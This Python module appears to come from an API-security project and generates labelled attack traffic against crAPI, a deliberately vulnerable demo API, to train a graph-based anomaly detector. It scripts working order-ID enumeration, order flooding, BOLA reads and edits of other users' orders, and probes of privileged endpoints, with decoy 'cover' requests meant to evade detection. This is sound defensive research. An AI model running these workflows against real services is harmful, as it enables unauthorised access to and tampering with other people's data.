"""
Shop attack workflows for behavioural (GNN) training data.

These attacks intentionally use OpenAPI-conformant requests so the
conformance branch stays quiet while the call graph looks anomalous.

Attack A — Order ID enumeration
Attack B — Order flooder
Attack C — Order BOLA (foreign known order access)
Attack D — Workshop BFLA (privileged management/mechanic functions)
"""

from __future__ import annotations

import asyncio
import json
import random
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Literal
from uuid import uuid4

import httpx

from apishield.ingestion.models import APIEvent
from apishield.traffic.client import TargetAPIClient
from apishield.traffic.dataset import JSONLDatasetWriter


DEFAULT_BASE_URL = "http://localhost:8888"
DEFAULT_ENUM_OUTPUT = Path("data/raw/shop_order_enumeration.jsonl")
DEFAULT_FLOOD_OUTPUT = Path("data/raw/shop_order_flooder.jsonl")
DEFAULT_BOLA_OUTPUT = Path("data/raw/shop_order_bola.jsonl")
DEFAULT_BFLA_OUTPUT = Path("data/raw/shop_workshop_bfla.jsonl")
DEFAULT_OWNERSHIP_OUTPUT = Path("data/raw/order_ownership.json")

# Attack steps stay fast vs normal READ/THINK bands.
ATTACK_DELAY_BAND = (0.05, 0.80)

IdStrategy = Literal["sequential", "random_sample", "stride"]
IdMode = Literal["foreign", "mixed"]
CoverType = Literal["none", "products", "orders_all"]
ProductMode = Literal["fixed", "round_robin"]
FollowUp = Literal["none", "orders_all", "last_order"]
BflaProbe = Literal[
    "users_all",
    "mechanic_list",
    "service_requests",
    "mechanic_report",
]

BFLA_PROBE_KINDS: tuple[BflaProbe, ...] = (
    "users_all",
    "mechanic_list",
    "service_requests",
    "mechanic_report",
)


class ShopAttackWorkflows:
    """Generates randomised but skeleton-faithful shop attack sessions."""

    def __init__(
        self,
        *,
        base_url: str = DEFAULT_BASE_URL,
        delay_scale: float = 1.0,
    ) -> None:
        if delay_scale <= 0:
            raise ValueError("delay_scale must be > 0")

        self.base_url = base_url.rstrip("/")
        self.delay_scale = delay_scale

    async def run_order_enumeration_attack(
        self,
        email: str,
        password: str,
        *,
        user_id: str | None = None,
        output_path: str | Path = DEFAULT_ENUM_OUTPUT,
    ) -> list[APIEvent]:
        """
        Attack A skeleton (always preserved):
          login → optional light cover → many GET /orders/{id} (tight delays)
          → optional mid-burst orders/all

        Randomised: ID strategy, start/range, foreign vs mixed, cover.
        Status codes are recorded as-is (200/403/404 all fine).
        """

        resolved_user_id = user_id or email
        writer = JSONLDatasetWriter(output_path)
        client = TargetAPIClient(base_url=self.base_url, target_service="crapi")
        session_id = str(uuid4())
        events: list[APIEvent] = []

        login_event = await self._login(
            client,
            writer,
            email=email,
            password=password,
            user_id=resolved_user_id,
            session_id=session_id,
        )
        events.append(login_event)
        if login_event.response_status != 200:
            return events

        cover = random.choice(["none", "products", "orders_all"])
        owned_ids: list[int] = []

        if cover == "products":
            await self._attack_pause()
            _, cover_event = await self._request(
                client,
                writer,
                "GET",
                "/workshop/api/shop/products",
                session_id=session_id,
            )
            events.append(cover_event)
        elif cover == "orders_all":
            await self._attack_pause()
            list_response, cover_event = await self._request(
                client,
                writer,
                "GET",
                "/workshop/api/shop/orders/all",
                session_id=session_id,
                params={"limit": 30, "offset": 0},
            )
            events.append(cover_event)
            owned_ids = self._extract_order_ids_from_list(list_response)

        # Ensure we know some owned IDs when mixed mode needs them.
        id_mode: IdMode = random.choice(["foreign", "mixed"])
        if id_mode == "mixed" and not owned_ids:
            await self._attack_pause()
            list_response, list_event = await self._request(
                client,
                writer,
                "GET",
                "/workshop/api/shop/orders/all",
                session_id=session_id,
                params={"limit": 30, "offset": 0},
            )
            events.append(list_event)
            owned_ids = self._extract_order_ids_from_list(list_response)

        strategy: IdStrategy = random.choice(
            ["sequential", "random_sample", "stride"]
        )
        start = random.randint(1, 50)
        count = random.randint(15, 80)
        max_id = max(start + count * 3, 200)

        target_ids = self._build_enumeration_ids(
            strategy=strategy,
            start=start,
            count=count,
            max_id=max_id,
        )

        if id_mode == "mixed" and owned_ids:
            # Sprinkle 1–2 owned IDs into the scan without shrinking cardinality.
            mix_count = min(2, len(owned_ids))
            for owned in random.sample(owned_ids, mix_count):
                insert_at = random.randint(0, len(target_ids))
                target_ids.insert(insert_at, owned)

        insert_orders_all = random.random() < 0.35
        mid_index = len(target_ids) // 2 if target_ids else 0

        for index, order_id in enumerate(target_ids):
            await self._attack_pause()
            _, enum_event = await self._request(
                client,
                writer,
                "GET",
                f"/workshop/api/shop/orders/{order_id}",
                session_id=session_id,
            )
            events.append(enum_event)

            if insert_orders_all and index == mid_index and index > 0:
                await self._attack_pause()
                _, mid_event = await self._request(
                    client,
                    writer,
                    "GET",
                    "/workshop/api/shop/orders/all",
                    session_id=session_id,
                    params={"limit": 30, "offset": 0},
                )
                events.append(mid_event)

        return events

    async def run_order_flooder_attack(
        self,
        email: str,
        password: str,
        *,
        user_id: str | None = None,
        output_path: str | Path = DEFAULT_FLOOD_OUTPUT,
    ) -> list[APIEvent]:
        """
        Attack B skeleton (always preserved):
          login → optional GET products → many POST /orders (tight delays)
          → optional follow-up

        Randomised: POST count, product fixed vs round-robin, quantity, follow-up.
        """

        resolved_user_id = user_id or email
        writer = JSONLDatasetWriter(output_path)
        client = TargetAPIClient(base_url=self.base_url, target_service="crapi")
        session_id = str(uuid4())
        events: list[APIEvent] = []

        login_event = await self._login(
            client,
            writer,
            email=email,
            password=password,
            user_id=resolved_user_id,
            session_id=session_id,
        )
        events.append(login_event)
        if login_event.response_status != 200:
            return events

        product_ids: list[int] = [1]
        if random.random() < 0.75:
            await self._attack_pause()
            products_response, products_event = await self._request(
                client,
                writer,
                "GET",
                "/workshop/api/shop/products",
                session_id=session_id,
            )
            events.append(products_event)
            extracted = self._extract_product_ids(products_response)
            if extracted:
                product_ids = extracted

        post_count = random.randint(10, 40)
        product_mode: ProductMode = random.choice(["fixed", "round_robin"])
        fixed_product_id = random.choice(product_ids)
        max_quantity = 3

        created_order_id: int | None = None

        for index in range(post_count):
            await self._attack_pause()

            if product_mode == "fixed":
                product_id = fixed_product_id
            else:
                product_id = product_ids[index % len(product_ids)]

            quantity = random.randint(1, max_quantity)
            order_response, order_event = await self._request(
                client,
                writer,
                "POST",
                "/workshop/api/shop/orders",
                session_id=session_id,
                json={
                    "product_id": product_id,
                    "quantity": quantity,
                },
            )
            events.append(order_event)

            if order_response.status_code == 200:
                created = self._extract_created_order_id(order_response)
                if created is not None:
                    created_order_id = created

        follow_up: FollowUp = random.choice(
            ["none", "orders_all", "last_order"]
        )

        if follow_up == "orders_all":
            await self._attack_pause()
            _, follow_event = await self._request(
                client,
                writer,
                "GET",
                "/workshop/api/shop/orders/all",
                session_id=session_id,
                params={"limit": 30, "offset": 0},
            )
            events.append(follow_event)
        elif follow_up == "last_order" and created_order_id is not None:
            await self._attack_pause()
            _, follow_event = await self._request(
                client,
                writer,
                "GET",
                f"/workshop/api/shop/orders/{created_order_id}",
                session_id=session_id,
            )
            events.append(follow_event)

        return events

    def _build_enumeration_ids(
        self,
        *,
        strategy: IdStrategy,
        start: int,
        count: int,
        max_id: int,
    ) -> list[int]:
        if strategy == "sequential":
            return list(range(start, start + count))

        if strategy == "stride":
            stride = random.choice([2, 3, 5])
            return list(range(start, start + count * stride, stride))[:count]

        # random_sample over a wide pool
        pool = list(range(1, max_id + 1))
        if len(pool) <= count:
            return pool
        return sorted(random.sample(pool, count))

    async def _login(
        self,
        client: TargetAPIClient,
        writer: JSONLDatasetWriter,
        *,
        email: str,
        password: str,
        user_id: str,
        session_id: str,
    ) -> APIEvent:
        client._user_id = user_id

        response, event = await self._request(
            client,
            writer,
            "POST",
            "/identity/api/auth/login",
            session_id=session_id,
            json={
                "email": email,
                "password": password,
            },
        )

        if response.status_code == 200:
            payload = self._safe_json(response)
            token = payload.get("token") if isinstance(payload, dict) else None
            if not token:
                raise RuntimeError(
                    "Login succeeded but no authentication token was returned."
                )
            client.apply_session(
                token,
                user_id=user_id,
                role=payload.get("role") if isinstance(payload, dict) else None,
            )

        return event

    async def _request(
        self,
        client: TargetAPIClient,
        writer: JSONLDatasetWriter,
        method: str,
        path: str,
        *,
        session_id: str,
        params: dict[str, Any] | None = None,
        json: dict[str, Any] | None = None,
    ) -> tuple[httpx.Response, APIEvent]:
        response, event = await client.request(
            method,
            path,
            params=params,
            json=json,
        )
        event = event.model_copy(
            update={
                "session_id": session_id,
                "timestamp": datetime.now(timezone.utc),
                "request_body": self._redact_request_body(json),
            }
        )
        writer.write(event)
        return response, event

    async def _attack_pause(self) -> None:
        low, high = ATTACK_DELAY_BAND
        delay = random.uniform(low, high) * self.delay_scale
        delay = max(delay, 0.02)
        await asyncio.sleep(delay)

    @staticmethod
    def _redact_request_body(body: dict[str, Any] | None) -> dict[str, Any] | None:
        if not isinstance(body, dict):
            return body
        redacted = dict(body)
        for key in ("password", "token", "otp", "secret"):
            if key in redacted and redacted[key] is not None:
                redacted[key] = "[REDACTED]"
        return redacted

    @staticmethod
    def _safe_json(response: httpx.Response) -> Any:
        try:
            return response.json()
        except ValueError:
            return None

    def _extract_product_ids(self, response: httpx.Response) -> list[int]:
        payload = self._safe_json(response)
        if not isinstance(payload, dict):
            return []
        products = payload.get("products", [])
        if not isinstance(products, list):
            return []

        ids: list[int] = []
        for product in products:
            if not isinstance(product, dict) or product.get("id") is None:
                continue
            try:
                ids.append(int(product["id"]))
            except (TypeError, ValueError):
                continue
        return ids

    def _extract_created_order_id(self, response: httpx.Response) -> int | None:
        payload = self._safe_json(response)
        if not isinstance(payload, dict):
            return None
        order_id = payload.get("id")
        try:
            return int(order_id) if order_id is not None else None
        except (TypeError, ValueError):
            return None

    def _extract_order_ids_from_list(self, response: httpx.Response) -> list[int]:
        payload = self._safe_json(response)
        if payload is None:
            return []

        if isinstance(payload, dict):
            orders = (
                payload.get("orders")
                or payload.get("order")
                or payload.get("data")
                or []
            )
        elif isinstance(payload, list):
            orders = payload
        else:
            return []

        if isinstance(orders, dict):
            orders = [orders]
        if not isinstance(orders, list):
            return []

        ids: list[int] = []
        for order in orders:
            if not isinstance(order, dict) or order.get("id") is None:
                continue
            try:
                ids.append(int(order["id"]))
            except (TypeError, ValueError):
                continue
        return ids

    async def collect_order_ownership(
        self,
        users: list[dict[str, str]],
        *,
        ownership_path: str | Path = DEFAULT_OWNERSHIP_OUTPUT,
        page_limit: int = 30,
        max_pages: int = 20,
    ) -> dict[str, Any]:
        """
        Login each user and collect their order IDs via orders/all.

        Writes a JSON file shaped like:
          {
            "users": {
              "<user_id>": {
                "email": "...",
                "order_ids": [1, 2],
                "order_count": 2
              }
            }
          }
        """

        ownership: dict[str, Any] = {
            "collected_at": datetime.now(timezone.utc).isoformat(),
            "base_url": self.base_url,
            "users": {},
        }

        for user in users:
            user_id = user["name"]
            email = user["email"]
            password = user["password"]

            client = TargetAPIClient(
                base_url=self.base_url,
                target_service="crapi",
            )
            client._user_id = user_id

            login_response, _ = await client.request(
                "POST",
                "/identity/api/auth/login",
                json={"email": email, "password": password},
            )
            if login_response.status_code != 200:
                ownership["users"][user_id] = {
                    "email": email,
                    "order_ids": [],
                    "order_count": 0,
                    "login_status": login_response.status_code,
                    "error": "login_failed",
                }
                continue

            payload = self._safe_json(login_response)
            token = payload.get("token") if isinstance(payload, dict) else None
            if not token:
                ownership["users"][user_id] = {
                    "email": email,
                    "order_ids": [],
                    "order_count": 0,
                    "error": "missing_token",
                }
                continue

            client.apply_session(token, user_id=user_id)

            order_ids: list[int] = []
            for page in range(max_pages):
                offset = page * page_limit
                list_response, _ = await client.request(
                    "GET",
                    "/workshop/api/shop/orders/all",
                    params={"limit": page_limit, "offset": offset},
                )
                if list_response.status_code != 200:
                    break

                page_ids = self._extract_order_ids_from_list(list_response)
                if not page_ids:
                    break

                for oid in page_ids:
                    if oid not in order_ids:
                        order_ids.append(oid)

                if len(page_ids) < page_limit:
                    break

            ownership["users"][user_id] = {
                "email": email,
                "order_ids": order_ids,
                "order_count": len(order_ids),
                "login_status": 200,
            }

        path = Path(ownership_path)
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(
            json.dumps(ownership, indent=2),
            encoding="utf-8",
        )
        return ownership

    async def run_order_bola_attack(
        self,
        attacker: dict[str, str],
        access_plan: list[tuple[str, int]],
        *,
        output_path: str | Path = DEFAULT_BOLA_OUTPUT,
        skip_probability: float = 0.05,
        traversal: Literal["ordered", "random"] = "ordered",
    ) -> list[APIEvent]:
        """
        Shop BOLA skeleton:
          login(attacker)
          → optional cover
          → walk access_plan of (victim_user_id, order_id)
             - ordered: already user→user, object→object
             - random: shuffled plan
             - each object skipped with skip_probability
          → optional trailing own orders/all

        access_plan entries are foreign owned orders only.
        """

        if not access_plan:
            raise ValueError("BOLA requires at least one foreign order access.")

        if not 0.0 <= skip_probability <= 1.0:
            raise ValueError("skip_probability must be in [0, 1].")

        writer = JSONLDatasetWriter(output_path)
        client = TargetAPIClient(base_url=self.base_url, target_service="crapi")
        session_id = str(uuid4())
        events: list[APIEvent] = []

        attacker_id = attacker["name"]
        login_event = await self._login(
            client,
            writer,
            email=attacker["email"],
            password=attacker["password"],
            user_id=attacker_id,
            session_id=session_id,
        )
        events.append(login_event)
        if login_event.response_status != 200:
            return events

        cover = random.choice(["none", "products", "orders_all"])
        if cover == "products":
            await self._attack_pause()
            _, cover_event = await self._request(
                client,
                writer,
                "GET",
                "/workshop/api/shop/products",
                session_id=session_id,
            )
            events.append(cover_event)
        elif cover == "orders_all":
            await self._attack_pause()
            _, cover_event = await self._request(
                client,
                writer,
                "GET",
                "/workshop/api/shop/orders/all",
                session_id=session_id,
                params={"limit": 30, "offset": 0},
            )
            events.append(cover_event)

        plan = list(access_plan)
        if traversal == "random":
            random.shuffle(plan)
        # ordered: keep plan as provided (victim blocks, objects in list order)

        mutate_mode = random.choice(["get_only", "get_put", "get_return"])

        for _victim_id, order_id in plan:
            if random.random() < skip_probability:
                continue

            await self._attack_pause()
            _, get_event = await self._request(
                client,
                writer,
                "GET",
                f"/workshop/api/shop/orders/{order_id}",
                session_id=session_id,
            )
            events.append(get_event)

            if mutate_mode == "get_put":
                await self._attack_pause()
                _, put_event = await self._request(
                    client,
                    writer,
                    "PUT",
                    f"/workshop/api/shop/orders/{order_id}",
                    session_id=session_id,
                    json={"product_id": 1, "quantity": 1},
                )
                events.append(put_event)
            elif mutate_mode == "get_return":
                await self._attack_pause()
                _, return_event = await self._request(
                    client,
                    writer,
                    "POST",
                    "/workshop/api/shop/orders/return_order",
                    session_id=session_id,
                    params={"order_id": order_id},
                )
                events.append(return_event)

        if random.random() < 0.40:
            await self._attack_pause()
            _, trailing = await self._request(
                client,
                writer,
                "GET",
                "/workshop/api/shop/orders/all",
                session_id=session_id,
                params={"limit": 30, "offset": 0},
            )
            events.append(trailing)

        return events

    async def run_workshop_bfla_attack(
        self,
        email: str,
        password: str,
        *,
        user_id: str | None = None,
        output_path: str | Path = DEFAULT_BFLA_OUTPUT,
    ) -> list[APIEvent]:
        """
        Workshop BFLA skeleton:
          login (normal shop user)
          → optional shop cover (products / orders/all)
          → hit k random privileged endpoints (k in 1..4)
          → optional trailing shop cover

        Privileged probes (no mechanic seed required):
          GET /workshop/api/management/users/all
          GET /workshop/api/mechanic/
          GET /workshop/api/mechanic/service_requests
          GET /workshop/api/mechanic/mechanic_report?report_id=...
        """

        resolved_user_id = user_id or email
        writer = JSONLDatasetWriter(output_path)
        client = TargetAPIClient(base_url=self.base_url, target_service="crapi")
        session_id = str(uuid4())
        events: list[APIEvent] = []

        login_event = await self._login(
            client,
            writer,
            email=email,
            password=password,
            user_id=resolved_user_id,
            session_id=session_id,
        )
        events.append(login_event)
        if login_event.response_status != 200:
            return events

        cover = random.choice(["none", "products", "orders_all"])
        if cover == "products":
            await self._attack_pause()
            _, cover_event = await self._request(
                client,
                writer,
                "GET",
                "/workshop/api/shop/products",
                session_id=session_id,
            )
            events.append(cover_event)
        elif cover == "orders_all":
            await self._attack_pause()
            _, cover_event = await self._request(
                client,
                writer,
                "GET",
                "/workshop/api/shop/orders/all",
                session_id=session_id,
                params={"limit": 30, "offset": 0},
            )
            events.append(cover_event)

        k = random.randint(1, len(BFLA_PROBE_KINDS))
        probes = random.sample(list(BFLA_PROBE_KINDS), k)
        for probe in probes:
            probe_events = await self._run_bfla_probe(
                client,
                writer,
                probe,
                session_id=session_id,
            )
            events.extend(probe_events)

        if random.random() < 0.40:
            await self._attack_pause()
            _, trailing = await self._request(
                client,
                writer,
                "GET",
                "/workshop/api/shop/orders/all",
                session_id=session_id,
                params={"limit": 30, "offset": 0},
            )
            events.append(trailing)

        return events

    async def _run_bfla_probe(
        self,
        client: TargetAPIClient,
        writer: JSONLDatasetWriter,
        probe: BflaProbe,
        *,
        session_id: str,
    ) -> list[APIEvent]:
        events: list[APIEvent] = []

        if probe == "users_all":
            pages = random.randint(1, 2)
            for page in range(pages):
                await self._attack_pause()
                _, event = await self._request(
                    client,
                    writer,
                    "GET",
                    "/workshop/api/management/users/all",
                    session_id=session_id,
                    params={"limit": 10, "offset": page * 10},
                )
                events.append(event)
            return events

        if probe == "mechanic_list":
            await self._attack_pause()
            _, event = await self._request(
                client,
                writer,
                "GET",
                "/workshop/api/mechanic/",
                session_id=session_id,
            )
            events.append(event)
            return events

        if probe == "service_requests":
            await self._attack_pause()
            _, event = await self._request(
                client,
                writer,
                "GET",
                "/workshop/api/mechanic/service_requests",
                session_id=session_id,
                params={"limit": 30, "offset": 0},
            )
            events.append(event)
            return events

        # mechanic_report: blind report_id probes (empty/400 still fine)
        probe_count = random.randint(1, 3)
        report_pool = list(range(1, 31))
        report_ids = random.sample(report_pool, probe_count)
        for report_id in report_ids:
            await self._attack_pause()
            _, event = await self._request(
                client,
                writer,
                "GET",
                "/workshop/api/mechanic/mechanic_report",
                session_id=session_id,
                params={"report_id": report_id},
            )
            events.append(event)
        return events


async def collect_order_ownership(
    users: list[dict[str, str]],
    *,
    base_url: str = DEFAULT_BASE_URL,
    ownership_path: str | Path = DEFAULT_OWNERSHIP_OUTPUT,
    delay_scale: float = 1.0,
) -> dict[str, Any]:
    """Collect and persist per-user shop order ownership."""

    runner = ShopAttackWorkflows(base_url=base_url, delay_scale=delay_scale)
    return await runner.collect_order_ownership(
        users,
        ownership_path=ownership_path,
    )


async def run_order_bola_attack(
    attacker: dict[str, str],
    access_plan: list[tuple[str, int]],
    *,
    base_url: str = DEFAULT_BASE_URL,
    output_path: str | Path = DEFAULT_BOLA_OUTPUT,
    delay_scale: float = 1.0,
    skip_probability: float = 0.05,
    traversal: Literal["ordered", "random"] = "ordered",
) -> list[APIEvent]:
    """Invokable entrypoint for shop order BOLA attack."""

    runner = ShopAttackWorkflows(base_url=base_url, delay_scale=delay_scale)
    return await runner.run_order_bola_attack(
        attacker,
        access_plan,
        output_path=output_path,
        skip_probability=skip_probability,
        traversal=traversal,
    )


async def run_order_enumeration_attack(
    email: str,
    password: str,
    *,
    user_id: str | None = None,
    base_url: str = DEFAULT_BASE_URL,
    output_path: str | Path = DEFAULT_ENUM_OUTPUT,
    delay_scale: float = 1.0,
) -> list[APIEvent]:
    """Invokable entrypoint for shop order-ID enumeration attack."""

    runner = ShopAttackWorkflows(base_url=base_url, delay_scale=delay_scale)
    return await runner.run_order_enumeration_attack(
        email,
        password,
        user_id=user_id,
        output_path=output_path,
    )


async def run_order_flooder_attack(
    email: str,
    password: str,
    *,
    user_id: str | None = None,
    base_url: str = DEFAULT_BASE_URL,
    output_path: str | Path = DEFAULT_FLOOD_OUTPUT,
    delay_scale: float = 1.0,
) -> list[APIEvent]:
    """Invokable entrypoint for shop order-flooder attack."""

    runner = ShopAttackWorkflows(base_url=base_url, delay_scale=delay_scale)
    return await runner.run_order_flooder_attack(
        email,
        password,
        user_id=user_id,
        output_path=output_path,
    )


async def run_workshop_bfla_attack(
    email: str,
    password: str,
    *,
    user_id: str | None = None,
    base_url: str = DEFAULT_BASE_URL,
    output_path: str | Path = DEFAULT_BFLA_OUTPUT,
    delay_scale: float = 1.0,
) -> list[APIEvent]:
    """Invokable entrypoint for workshop BFLA (privileged-function) attack."""

    runner = ShopAttackWorkflows(base_url=base_url, delay_scale=delay_scale)
    return await runner.run_workshop_bfla_attack(
        email,
        password,
        user_id=user_id,
        output_path=output_path,
    )
